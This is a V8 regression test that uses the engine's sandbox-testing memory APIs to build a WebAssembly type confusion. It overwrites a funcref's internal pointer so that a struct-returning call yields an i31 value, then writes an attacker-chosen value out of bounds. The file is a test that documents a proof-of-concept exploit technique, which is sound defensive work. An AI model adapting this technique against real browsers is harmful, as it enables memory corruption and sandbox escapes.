// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

const builder = new WasmModuleBuilder();
const kNumFields = 9999;
let $struct =
    builder.addStruct(new Array(kNumFields).fill(makeField(kWasmI64, true)));
let $sig_struct = builder.addType(makeSig([], [wasmRefType($struct)]));
let $sig_any = builder.addType(makeSig([], [kWasmAnyRef]));
let $box = builder.addStruct([makeField(kWasmFuncRef, true)]);

let $f_struct = builder.addFunction('f_struct', $sig_struct)
                    .exportFunc()
                    .addBody([
                      kGCPrefix,
                      kExprStructNewDefault,
                      $struct,
                    ]);
let $f_any = builder.addFunction('f_any', $sig_any)
                 .exportFunc()
                 .addBody([
                   ...wasmI32Const(0x7fffffff),
                   kGCPrefix,
                   kExprRefI31,
                 ]);
builder.addFunction('get_struct_fref', kSig_r_v)
    .exportFunc()
    .addBody([
      kExprRefFunc,
      $f_struct.index,
      kGCPrefix,
      kExprStructNew,
      $box,
      kGCPrefix,
      kExprExternConvertAny,
    ]);
builder.addFunction('get_any_fref', kSig_r_v)
    .exportFunc()
    .addBody([
      kExprRefFunc,
      $f_any.index,
      kGCPrefix,
      kExprStructNew,
      $box,
      kGCPrefix,
      kExprExternConvertAny,
    ]);
builder.addFunction('boom', makeSig([kWasmFuncRef, kWasmI64], []))
    .exportFunc()
    .addBody([
      kExprLocalGet,
      0,
      kGCPrefix,
      kExprRefCast,
      $sig_struct,
      kExprCallRef,
      $sig_struct,
      kExprLocalGet,
      1,
      kGCPrefix,
      kExprStructSet,
      $struct,
      ...wasmUnsignedLeb(kNumFields - 1),
    ]);

let instance = builder.instantiate();
let {boom, get_struct_fref, get_any_fref, f_struct} = instance.exports;

const kHeapObjectTag = 1;
const kStructField0Offset = 8;
const kWasmFuncRefType = Sandbox.getInstanceTypeIdFor('WASM_FUNC_REF_TYPE');
const kWasmFuncRefInternalOffset =
    Sandbox.getFieldOffset(kWasmFuncRefType, 'trusted_internal');

let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

let struct_box = getPtr(get_struct_fref());
let struct_fref = getField(struct_box, kStructField0Offset);

let any_box = getPtr(get_any_fref());
let any_fref = getField(any_box, kStructField0Offset);
let any_int = getField(any_fref, kWasmFuncRefInternalOffset);

// Swap struct_fref's trusted_internal to point to any_int (f_any)
setField(struct_fref, kWasmFuncRefInternalOffset, any_int);

boom(f_struct, 0x41414141n);
